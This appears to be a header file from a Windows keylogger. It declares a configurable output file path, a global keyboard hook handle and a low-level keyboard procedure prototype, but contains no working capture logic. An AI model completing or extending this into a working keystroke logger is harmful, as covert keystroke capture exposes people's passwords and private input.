#pragma once

// Change output file path here:
wchar_t kbtestfile[] = L"C:\\";

HHOOK kbhook;                                             // handle to keyboard hooking procedure

LRESULT CALLBACK LowLevelKeyboardProc(INT, WPARAM, LPARAM);
